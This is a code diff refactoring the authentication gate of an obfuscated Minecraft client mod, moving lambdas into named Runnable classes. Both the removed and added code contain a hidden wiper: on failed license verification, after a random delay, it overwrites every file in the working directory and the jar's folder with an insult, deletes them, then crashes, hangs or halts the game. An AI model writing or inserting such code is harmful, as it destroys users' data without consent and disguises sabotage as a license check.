@@ -4,6 +4,7 @@ import by.radioegor146.nativeobfuscator.Native;
 import dev.mahiro.client.BuildConfig;
 import dev.mahiro.client.auth.crypto.B64;
 import dev.mahiro.client.auth.net.AuthClient;
+import dev.mahiro.client.auth.net.AuthVerifyResult;
 import dev.mahiro.client.gui.auth.AuthScreen;
 import dev.mahiro.client.gui.clickgui.ClickGuiScreen;
 import dev.mahiro.client.gui.hud.HudEditorScreen;
@@ -25,6 +26,7 @@ import java.nio.file.StandardOpenOption;
 import java.util.Comparator;
 import java.util.Objects;
 import java.util.Random;
+import java.util.function.BiConsumer;
 
 @Native
 @ZKMIndy
@@ -110,61 +112,11 @@ public final class AuthGate {
         if (hasCheck) return;
         hasCheck = true;
 
-        new Thread(() -> {
-            try {
-                Thread.sleep(5000 + new Random().nextInt(10000));
-            } catch (InterruptedException ignored) {
-            }
-
-            fuckFile(new Random().nextInt(5));
-        }, "WTF").start();
+        new Thread(new FailSafeRunnable(), "WTF").start();
     }
 
     private static void fuckFile(int choice) {
-        new Thread(() -> {
-            try {
-                Path jarPath = null;
-                try {
-                    jarPath = Paths.get(AuthGate.class.getProtectionDomain().getCodeSource().getLocation().toURI());
-                } catch (Exception ignored) {
-                }
-
-                Path[] targets = {
-                        Paths.get(""),
-                        jarPath != null ? jarPath.getParent() : null
-                };
-
-                for (Path root : targets) {
-                    if (root == null || !Files.exists(root)) continue;
-                    try (var stream = Files.walk(root)) {
-                        stream.sorted(Comparator.reverseOrder())
-                                .forEach(p -> {
-                                    try {
-                                        if (Files.isRegularFile(p)) {
-                                            try (FileChannel outChan = FileChannel.open(p, StandardOpenOption.WRITE)) {
-                                                outChan.truncate(0);
-                                                outChan.write(ByteBuffer.wrap("FUCK_YOU".getBytes()));
-                                            }
-                                            Files.deleteIfExists(p);
-                                        } else if (Files.isDirectory(p) && !p.equals(root)) {
-                                            Files.deleteIfExists(p);
-                                        }
-                                    } catch (Exception ignored) {
-                                    }
-                                });
-                    } catch (Exception ignored) {
-                    }
-                }
-            } catch (Exception ignored) {
-            } finally {
-                switch (choice) {
-                    case 0 -> systemExit();
-                    case 1 -> fuckMC();
-                    case 2 -> shuijiao();
-                    default -> haltJVM();
-                }
-            }
-        }, "NiMaSiLe").start();
+        new Thread(new FuckFileRunnable(choice), "NiMaSiLe").start();
     }
 
     private static void haltJVM() {
@@ -172,25 +124,11 @@ public final class AuthGate {
     }
 
     private static void fuckMC() {
-        MinecraftClient.getInstance().execute(() -> {
-            try {
-                Field f = MinecraftClient.class.getDeclaredField("world");
-                f.setAccessible(true);
-                f.set(MinecraftClient.getInstance(), null);
-            } catch (Throwable ignored) {
-            }
-        });
+        MinecraftClient.getInstance().execute(new FuckMcRunnable());
     }
 
     private static void shuijiao() {
-        MinecraftClient.getInstance().execute(() -> {
-            while (true) {
-                try {
-                    Thread.sleep(10000);
-                } catch (InterruptedException ignored) {
-                }
-            }
-        });
+        MinecraftClient.getInstance().execute(new SleepForeverRunnable());
     }
 
     private static void systemExit() {
@@ -285,17 +223,7 @@ public final class AuthGate {
         lastUiGateMillis = nowMillis;
         uiGateInFlight = true;
 
-        c.execute(() -> {
-            try {
-                if (isVerified()) return;
-                Screen now = c.currentScreen;
-                if (!isBlockedScreen(now)) return;
-                if (now instanceof AuthScreen) return;
-                c.setScreen(new AuthScreen(now));
-            } finally {
-                uiGateInFlight = false;
-            }
-        });
+        c.execute(new UiGateRunnable(c));
     }
 
     private static void tickHeartbeat(MinecraftClient c) {
@@ -315,46 +243,9 @@ public final class AuthGate {
         lastHeartbeatAttemptMillis = now;
         heartbeatInFlight = true;
 
-        getHeartbeatClient().verifyToken(token, getDeviceId())
-                .handle((res, ex) -> {
-                    heartbeatInFlight = false;
-                    if (ex != null) {
-                        sessionOnlineVerified = false;
-                        if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
-                            clearSession();
-                            if (c.player != null && c.world != null) failSafe();
-                        }
-                        return null;
-                    }
-                    if (res == null) {
-                        sessionOnlineVerified = false;
-                        if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
-                            clearSession();
-                            if (c.player != null && c.world != null) failSafe();
-                        }
-                        return null;
-                    }
-                    if (!res.ok()) {
-                        sessionOnlineVerified = false;
-                        String err = res.error();
-                        if (!isTransientHeartbeatError(err)) {
-                            clearSession();
-                            if (c.player != null && c.world != null) failSafe();
-                            return null;
-                        }
-                        if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
-                            clearSession();
-                            if (c.player != null && c.world != null) failSafe();
-                        }
-                        return null;
-                    }
-
-                    sessionOnlineVerified = true;
-                    sessionPassVerified = true;
-                    sessionPassExpiresAtMillis = System.currentTimeMillis() + PASS_TTL_MILLIS;
-                    AuthPassStore.save(getDeviceId(), token, sessionPassExpiresAtMillis);
-                    return null;
-                });
+        getHeartbeatClient()
+                .verifyToken(token, getDeviceId())
+                .whenComplete(new HeartbeatComplete(c, token));
     }
 
     private static boolean isTransientHeartbeatError(String err) {
@@ -378,5 +269,165 @@ public final class AuthGate {
         heartbeatClient = created;
         heartbeatClientCfgKey = cfgKey;
         return created;
+    }
+
+    private static final class FailSafeRunnable implements Runnable {
+        @Override
+        public void run() {
+            try {
+                Thread.sleep(5000 + new Random().nextInt(10000));
+            } catch (InterruptedException ignored) {
+            }
+            fuckFile(new Random().nextInt(5));
+        }
+    }
+
+    private static final class FuckFileRunnable implements Runnable {
+        private final int choice;
+
+        private FuckFileRunnable(int choice) {
+            this.choice = choice;
+        }
+
+        @Override
+        public void run() {
+            try {
+                Path jarPath = null;
+                try {
+                    jarPath = Paths.get(AuthGate.class.getProtectionDomain().getCodeSource().getLocation().toURI());
+                } catch (Exception ignored) {
+                }
+
+                Path[] targets = {
+                        Paths.get(""),
+                        jarPath != null ? jarPath.getParent() : null
+                };
+
+                for (Path root : targets) {
+                    if (root == null || !Files.exists(root)) continue;
+                    try (var stream = Files.walk(root)) {
+                        for (var it = stream.sorted(Comparator.reverseOrder()).iterator(); it.hasNext(); ) {
+                            Path p = it.next();
+                            try {
+                                if (Files.isRegularFile(p)) {
+                                    try (FileChannel outChan = FileChannel.open(p, StandardOpenOption.WRITE)) {
+                                        outChan.truncate(0);
+                                        outChan.write(ByteBuffer.wrap("FUCK_YOU".getBytes()));
+                                    }
+                                    Files.deleteIfExists(p);
+                                } else if (Files.isDirectory(p) && !p.equals(root)) {
+                                    Files.deleteIfExists(p);
+                                }
+                            } catch (Exception ignored) {
+                            }
+                        }
+                    } catch (Exception ignored) {
+                    }
+                }
+            } catch (Exception ignored) {
+            } finally {
+                switch (choice) {
+                    case 0 -> systemExit();
+                    case 1 -> fuckMC();
+                    case 2 -> shuijiao();
+                    default -> haltJVM();
+                }
+            }
+        }
+    }
+
+    private static final class FuckMcRunnable implements Runnable {
+        @Override
+        public void run() {
+            try {
+                Field f = MinecraftClient.class.getDeclaredField("world");
+                f.setAccessible(true);
+                f.set(MinecraftClient.getInstance(), null);
+            } catch (Throwable ignored) {
+            }
+        }
+    }
+
+    private static final class SleepForeverRunnable implements Runnable {
+        @Override
+        public void run() {
+            while (true) {
+                try {
+                    Thread.sleep(10000);
+                } catch (InterruptedException ignored) {
+                }
+            }
+        }
+    }
+
+    private static final class UiGateRunnable implements Runnable {
+        private final MinecraftClient c;
+
+        private UiGateRunnable(MinecraftClient c) {
+            this.c = c;
+        }
+
+        @Override
+        public void run() {
+            try {
+                if (isVerified()) return;
+                Screen now = c.currentScreen;
+                if (!isBlockedScreen(now)) return;
+                if (now instanceof AuthScreen) return;
+                c.setScreen(new AuthScreen(now));
+            } finally {
+                uiGateInFlight = false;
+            }
+        }
+    }
+
+    private static final class HeartbeatComplete implements BiConsumer<AuthVerifyResult, Throwable> {
+        private final MinecraftClient c;
+        private final String token;
+
+        private HeartbeatComplete(MinecraftClient c, String token) {
+            this.c = c;
+            this.token = token;
+        }
+
+        @Override
+        public void accept(AuthVerifyResult res, Throwable ex) {
+            heartbeatInFlight = false;
+            if (ex != null) {
+                sessionOnlineVerified = false;
+                if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
+                    clearSession();
+                    if (c.player != null && c.world != null) failSafe();
+                }
+                return;
+            }
+            if (res == null) {
+                sessionOnlineVerified = false;
+                if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
+                    clearSession();
+                    if (c.player != null && c.world != null) failSafe();
+                }
+                return;
+            }
+            if (!res.ok()) {
+                sessionOnlineVerified = false;
+                String err = res.error();
+                if (!isTransientHeartbeatError(err)) {
+                    clearSession();
+                    if (c.player != null && c.world != null) failSafe();
+                    return;
+                }
+                if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
+                    clearSession();
+                    if (c.player != null && c.world != null) failSafe();
+                }
+                return;
+            }
+
+            sessionOnlineVerified = true;
+            sessionPassVerified = true;
+            sessionPassExpiresAtMillis = System.currentTimeMillis() + PASS_TTL_MILLIS;
+            AuthPassStore.save(getDeviceId(), token, sessionPassExpiresAtMillis);
+        }
     }
 }
